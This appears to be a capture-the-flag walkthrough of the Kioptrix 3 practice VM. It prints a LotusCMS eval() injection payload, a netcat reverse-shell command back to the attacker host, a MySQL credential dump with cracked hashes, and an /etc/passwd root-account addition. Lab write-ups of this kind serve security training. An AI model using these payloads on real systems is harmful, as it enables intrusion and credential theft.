## Foreword:
There's a metasploit exploit for this, which for some reason didn't work on my machine. Hence, most of my solution is based on approach used by [OffSec](https://www.youtube.com/watch?v=Bkp3n___dko).

## NetDiscover:
`netdiscover -r 192.168.58.0/24`

## Nmap:
`nmap -A -vv -T4 192.168.58.132`

Notable Output: 
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAL4CpDFXD9Zn2ONktcyGQL37Dn6s9JaOv3oKjxfdiABm9GjRkLEtbSAK3vhBBUJTZcVKYZk21lFHAqoe/+pLr4U9yOLOBbSoKNSxQ2VHN9FOLc9C58hKMF/0sjDsSIZnaI4zO7M4HmdEMYXONrmj2x6qczbfqecs+z4cEYVUF3R3AAAAFQCuG9mm7mLm1GGqZRSICZ+omMZkKQAAAIEAnj8NDH48hL+Pp06GWQZOlhte8JRZT5do6n8+bCgRSOvaYLYGoNi/GBzlET6tMSjWMsyhVY/YKTNTXRjqzS1DqbODM7M1GzLjsmGtVlkLoQafV6HJ25JsKPCEzSImjeOCpzwRP5opjmMrYBMjjKqtIlWYpaUijT4uR08tdaTxCukAAACBAJeJ9j2DTugDAy+SLCa0dZCH+jnclNo3o6oINF1FjzICdgDONL2YbBeU3CiAL2BureorAE0lturvvrIC2xVn2vHhrLpz6NPbDAkrLV2/rwoavbCkYGrwXdBHd5ObqBIkoUKbI1hGIGA51nafI2tjoXPfIeHeNOep20hgr32x9x1x
|   2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyOv6c+5ON+N+ZNDtjetiZ0eUxnIR1U0UqSF+a24Pz2xqdnJC1EN0O3zxGJB3gfPdJlyqUDiozbEth1GBP//8wbWsa1pLJOL1YmcumEJCsitngnrVN7huACG127UjKP8hArECjCHzc1P372gN3AQ/h5aZd0VV17e03HnAJ64ZziOQzVJ+DKWJbiHoXC2cdD1P+nlhK5fULe0QBvmA14gkl2LWA6KILHiisHZpF+V3X7NvXYyCSSI9GeXwhW4RKOCGdGVbjYf7d93K9gj0oU7dHrbdNKgX0WosuhMuXmKleHkIxfyLAILYWrRRj0GVdhZfbI99J3TYaR/yLTpb0D6mhw==
80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration:
- 22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
- 80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)

## SSH:
No Exploit found for OpenSSH 4.7p1 

## Web:
No exploit found for PHP/5.2.4-2ubuntu5.6

## Checking out the website:
![image](https://github.com/user-attachments/assets/863e0fa2-3c33-44d2-9932-97258a801250)
![image](https://github.com/user-attachments/assets/423f5a7e-194d-4b62-ad6c-4ca79ced3fc1)
![image](https://github.com/user-attachments/assets/ab24ad5f-fda6-4bbd-9efc-36b1873363eb)
![image](https://github.com/user-attachments/assets/89f05fe9-7395-4a35-a6e3-5feb808c9b6d)

There's a home page, a blog page, a gallery page, a login page
SQL Injection doesn't work on login page, nothing much is found on other pages.
But we can see that `Proudly Powered by: LotusCMS` in login page

```
[msf](Jobs:0 Agents:0) >> search LotusCMS

Matching Modules
================

   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   0  exploit/multi/http/lcms_php_exec  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/lcms_php_exec

[msf](Jobs:0 Agents:0) >>
```
Using the above will give you the shell in metasploit session.
Unfortunately it didn't work for me, I had to do the hard way.

## Gaining Access:
--> Tried LFI/DFI, no change
--> Dropped an apostrophe at the page link
![image](https://github.com/user-attachments/assets/669726da-1a3d-460c-a458-bdb944ef0611)
Now we know that they are using `eval()` which is also what is being used in the metasploit script
`eval()` evaluates a string as php code
So we got a potential code execution method

Meddling the webpage with the code execution on BurpSuite
![image](https://github.com/user-attachments/assets/97e033ca-737b-4857-9d8e-c7355debf790)

![image](https://github.com/user-attachments/assets/0d24069a-931d-40d0-b673-fc4afceb30ac)

On sending a ping to our mchine from burpsuite
`page=index');shell_exec('ping+-c+3+192.168.58.128');//`

`sudo tcpdump -i any "icmp"`

![image](https://github.com/user-attachments/assets/89fd0056-635f-4c2d-a5c2-afa28a9d5c0e)

on checking for netcat

![image](https://github.com/user-attachments/assets/e9def5dc-f8d6-45e6-9544-f7951b4a8682)

`page=index');system('which+nc');#`

We find that it is there

`page=index');system('nc+192.168.58.128+4444+-e+/bin/bash');#`

![image](https://github.com/user-attachments/assets/619cd95c-2efc-4362-8296-ef952d9fa9b0)

We are in

Now to get tty I used https://sirensecurity.io/blog/break-out-get-that-tty/

![image](https://github.com/user-attachments/assets/a96431ff-e1ac-45d2-99d5-f72d81afe8fa)

So now we have to do Privilege Escalation

## Privilege Escalation

```
www-data@Kioptrix3:/home/www/kioptrix3.com$ find / -type f -perm -04000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/apache2/suexec
/usr/lib/pt_chown
/usr/bin/arping
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/at
/usr/bin/sudoedit
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/local/bin/ht
/usr/sbin/pppd
/usr/sbin/uuidd
/lib/dhcp3-client/call-dhclient-script
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/bin/ping6
/bin/su
www-data@Kioptrix3:/home/www/kioptrix3.com$ 
```
`grep -Ri 'sql' . --color=auto`

for checking sql database

![image](https://github.com/user-attachments/assets/6977ebb3-069e-4387-9294-692ba45a5ba3)

now logging into mysql

![image](https://github.com/user-attachments/assets/4a3a1ef9-3513-437f-8a24-2ad597692475)


```
mysql> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| gallery            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> use gallery
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
    -> ;
+----------------------+
| Tables_in_gallery    |
+----------------------+
| dev_accounts         | 
| gallarific_comments  | 
| gallarific_galleries | 
| gallarific_photos    | 
| gallarific_settings  | 
| gallarific_stats     | 
| gallarific_users     | 
+----------------------+
7 rows in set (0.00 sec)

mysql> select * from dev_accounts;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
+----+------------+----------------------------------+
2 rows in set (0.00 sec)

mysql>
```
crackstation give us the actual password
![image](https://github.com/user-attachments/assets/6f027a12-0a6b-46d6-9f36-8c80e94efb6f)

```
loneferret@Kioptrix3:/home/www/kioptrix3.com$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
loneferret@Kioptrix3:/home/www/kioptrix3.com$ 
```

![image](https://github.com/user-attachments/assets/db8676db-86f5-4e8a-8ea6-db1d1df2f62f)

Open /etc/passwd
and follow the steps in https://sirensecurity.io/blog/linux-privilege-escalation-resources/
```
openssl passwd -1
i<3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd
su siren
id
```
boom root








